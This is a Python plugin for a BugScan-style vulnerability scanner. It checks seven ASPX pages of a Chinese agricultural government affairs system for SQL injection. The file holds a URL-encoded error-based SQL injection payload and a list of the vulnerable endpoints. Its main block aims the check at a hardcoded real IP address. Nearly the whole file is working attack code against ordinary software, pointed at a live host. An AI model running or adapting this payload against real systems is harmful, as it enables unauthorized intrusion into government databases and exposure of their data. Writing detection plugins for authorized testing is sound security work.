#!/usr/bin/evn python
#-*-:coding:utf-8 -*-


#Author:wonderkun
#Name: 农友政务系统 sql注入  七处打包

#Refer:http://www.wooyun.org/bugs/wooyun-2010-095250 
#Refer:http://www.wooyun.org/bugs/wooyun-2010-097690

#Data:2016/1/30

'''
/ckq/pllistOut.aspx?tname=1&CountryName=test
/ckq/caiwgkview.aspx?tname=1&CountryName=test
/newsymItemView/DynamicItemViewOut.aspx?tname=test&CountryName=test
/newsymsum/VillagePersonalView.aspx?tname=test&CountryName=test

/symItemManage/ItemSixth.aspx?id=1
/symItemManage/ItemSecond.aspx?id=1
/WebDefault3.aspx?CountryName=test&level=0
'''

def  assign(service,arg):
    if  service=="nongyou":
        return True,arg

def  audit(arg):
    vun_urls=['ckq/pllistOut.aspx?tname=1&CountryName=test',
                'ckq/caiwgkview.aspx?tname=1&CountryName=test',
                'newsymItemView/DynamicItemViewOut.aspx?tname=test&CountryName=test',
                'newsymsum/VillagePersonalView.aspx?tname=test&CountryName=test',
                'symItemManage/ItemSixth.aspx?id=1',
                'symItemManage/ItemSecond.aspx?id=1',
                'WebDefault3.aspx?CountryName=test&level=0']
    payload="%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%281%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27svkA%27%3D%27svkA%26CountryName%3D1"    
    for vun_url in vun_urls:
        code,head,res,errcode,finnalurl=curl.curl2(arg+vun_url+payload)

        if code==500 and "c4ca4238a0b923820dcc509a6f75849b1" in res:
            security_hole('sql inject:'+arg+vun_url)
            
if __name__=='__main__':
    from dummy import *
    audit(assign('nongyou','http://222.135.76.147:8200/')[1])